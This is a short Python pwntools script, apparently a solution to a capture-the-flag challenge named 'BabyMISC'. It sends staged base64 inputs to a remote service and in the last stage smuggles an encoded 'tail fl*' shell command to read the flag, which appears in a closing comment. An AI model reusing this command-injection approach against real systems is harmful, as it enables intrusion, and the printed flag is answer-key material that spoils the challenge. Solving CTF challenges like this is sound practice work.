#!/usr/bin/env python2

from pwn import *
import base64

###

if len(sys.argv) > 1:
    DEBUG = False
else:
    DEBUG = True

context.log_level = 'info'

###

if DEBUG:
    r = process('./BabyMISC')
else:
    r = remote('110.10.212.138', 19090)

# stage 1
r.recvuntil('Input >')
r.sendline('TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA')
# stage 2
r.recvuntil('Input 1')
r.sendline('aGVsbG8AAA==')
r.recvuntil('Input 2')
r.sendline('aGVsbG8=')
# stage 3
r.recvuntil('Input >')
r.sendline(base64.b64encode('tail fl*'))
r.interactive()

# Nav3r_L3t_y0ur_L3ft_h4nd_kn0w_wh4t_y0ur_r1ghT_h4nd5_H4ck1ng
